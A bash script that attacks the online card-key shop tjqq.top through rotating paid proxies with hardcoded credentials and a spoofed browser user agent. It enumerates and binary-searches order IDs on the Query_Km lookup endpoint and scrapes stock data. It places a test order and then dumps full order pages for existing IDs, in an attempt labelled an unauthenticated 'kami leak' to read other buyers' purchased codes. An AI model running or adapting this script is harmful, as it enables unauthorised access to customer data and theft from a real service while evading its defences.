#!/bin/bash
# tjqq: Query_Km exist oracle dump, stock scan, order on in-stock SKU
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://tjqq.top
CK=/tmp/tjqq6.ck
OUT=/tmp/tjqq6_out
LOG=/tmp/tjqq6.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== Query_Km exact messages ==="
for id in 1 50 100 200 500 800 900 950 980 990 995 998 999 1000; do
  c "$BASE/Query_Km/$id" -o "$OUT/qm.html" >/dev/null
  python3 -c "
import re,sys
h=open('/tmp/tjqq6_out/qm.html',encoding='utf-8',errors='ignore').read()
# error/success class
m=re.search(r'class=\"(error|success)\"[^>]*>([^<]+)', h)
print(sys.argv[1], '=>', m.groups() if m else re.findall(r'<dt[^>]*>([^<]+)', h)[:3], 'len', len(h))
" "$id"
done

# binary search max existing id
echo "=== binary search max existing order id ==="
python3 - <<'PY'
import subprocess,re,os
proxy=os.environ.get('PROXY_URL','')
# read from log last PROXY - we'll use curl via bash helper file
open('/tmp/tjqq6_out/exist_ids.txt','w').write('')
PY

# use shell binary search
lo=1; hi=2000
# first find upper bound where fail
while (( hi - lo > 1 )); do
  mid=$(( (lo+hi)/2 ))
  c "$BASE/Query_Km/$mid" -o "$OUT/qm.html" >/dev/null
  cls=$(python3 -c "import re;h=open('/tmp/tjqq6_out/qm.html',encoding='utf-8',errors='ignore').read();m=re.search(r'class=\"(error|success)\"',h);print(m.group(1) if m else 'unk')")
  msg=$(python3 -c "import re;h=open('/tmp/tjqq6_out/qm.html',encoding='utf-8',errors='ignore').read();m=re.search(r'class=\"(?:error|success)\"[^>]*>([^<]+)',h);print(m.group(1) if m else '')")
  echo "BS mid=$mid cls=$cls msg=$msg"
  # "订单记录" path was exist-ish with len 2013; fail len 2039
  # classify by message content
  if echo "$msg" | grep -q '失败'; then
    hi=$mid
  else
    lo=$mid
  fi
done
echo "MAX_EXIST_LO=$lo HI=$hi"

# dump messages for lo and nearby
for id in $(seq $((lo>5?lo-5:1)) $((lo+5))); do
  c "$BASE/Query_Km/$id" -o "$OUT/qm_$id.html" >/dev/null
  python3 -c "
import re,sys
h=open(sys.argv[1],encoding='utf-8',errors='ignore').read()
m=re.search(r'class=\"(error|success)\"[^>]*>([^<]+)', h)
print('ID', sys.argv[2], m.groups() if m else h[h.find('ip-attack'):h.find('ip-attack')+300] if 'ip-attack' in h else 'no')
" "$OUT/qm_$id.html" "$id"
done

echo "=== stock scan Get_Yk_KC?gid= ==="
# collect trade ids from home
python3 - <<'PY'
import re
h=open('/tmp/tjqq6_out/home.html',encoding='utf-8',errors='ignore').read()
ids=sorted(set(int(x) for x in re.findall(r'/Trade/(\d+)\.html', h)))
print('trade_ids', ids)
open('/tmp/tjqq6_out/tids.txt','w').write('\n'.join(map(str,ids)))
# also Item pages
items=sorted(set(int(x) for x in re.findall(r'/Item/(\d+)\.html', h)))
print('items', items)
PY

while IFS= read -r gid; do
  [[ -z "$gid" ]] && continue
  r=$(c -H 'X-Requested-With: XMLHttpRequest' "$BASE/Get_Yk_KC.html?gid=$gid")
  echo "STOCK $gid => ${r:0:200}"
  echo "$r" > "$OUT/stock_$gid.json"
done < "$OUT/tids.txt"

echo "=== find in-stock and order ==="
# pick first with kucun>0
BUY_GID=$(python3 - <<'PY'
import json,os,re,glob
best=None
for fp in glob.glob('/tmp/tjqq6_out/stock_*.json'):
  gid=fp.split('_')[-1].split('.')[0]
  t=open(fp,encoding='utf-8',errors='ignore').read().strip()
  try:
    j=json.loads(t)
  except Exception:
    print(gid, 'nonjson', t[:80]); continue
  print('parsed', gid, j)
  kc=j.get('kucun')
  try: kc=int(kc)
  except Exception: kc=0
  if kc>0 and best is None:
    best=gid
print('BEST', best)
if best: open('/tmp/tjqq6_out/buy_gid.txt','w').write(best)
PY
)
echo "$BUY_GID"
if [[ -f "$OUT/buy_gid.txt" ]]; then
  GID=$(cat "$OUT/buy_gid.txt")
  echo "BUYING gid=$GID"
  c "$BASE/Trade/$GID.html" -o "$OUT/trade.html" -w "trade=%{http_code}\n"
  TOK=$(python3 -c "import re;h=open('/tmp/tjqq6_out/trade.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"\s+value=\"([^\"]+)\"',h);print(m.group(1) if m else '')")
  PASS=tjkami$(date +%H%M%S)
  echo TOK=$TOK PASS=$PASS
  c -D "$OUT/pay.hdr" -o "$OUT/pay.html" -w "PAY=%{http_code}:%{size_download}\n" \
    -H 'Content-Type: application/x-www-form-urlencoded' -e "$BASE/Trade/$GID.html" -X POST \
    --data-urlencode "paytype=udpay" --data-urlencode "gid=$GID" --data-urlencode "count=1" \
    --data-urlencode "pass=$PASS" --data-urlencode "__token__=$TOK" "$BASE/Pay"
  python3 - <<'PY'
import re
h=open('/tmp/tjqq6_out/pay.html',encoding='utf-8',errors='ignore').read()
m=re.search(r'class="(error|success)"[^>]*>([^<]+)', h)
print('pay_msg', m.groups() if m else None)
print('body', h[:1500])
# meta refresh / location
print('locs', re.findall(r'location\.href\s*=\s*[\'\"]([^\'\"]+)|url=([^\"]+)|Query_Km/(\d+)|R_YkPay/(\d+)', h))
open('/tmp/tjqq6_out/pass.txt','w').write(open('/tmp/tjqq6_out/pay.html','a').name)  # noop
PY
  echo "$PASS" > "$OUT/pass.txt"
  # extract order from success redirect pages - sometimes Pay returns HTML with order
  # also try following if success points to pay gateway
fi

echo "=== try Query_Km on existing ids for kami leak (unauth) ==="
# for existing ids, save full HTML - maybe unpaid still shows info
for id in 1 2 3 5 10 20 50 100 $lo; do
  c "$BASE/Query_Km/$id" -o "$OUT/full_$id.html" >/dev/null
  python3 -c "
import re,sys
h=open(sys.argv[1],encoding='utf-8',errors='ignore').read()
print('====', sys.argv[2], '====')
print(h)
" "$OUT/full_$id.html" "$id" | head -80
done

echo "===== PROBE6 DONE ====="
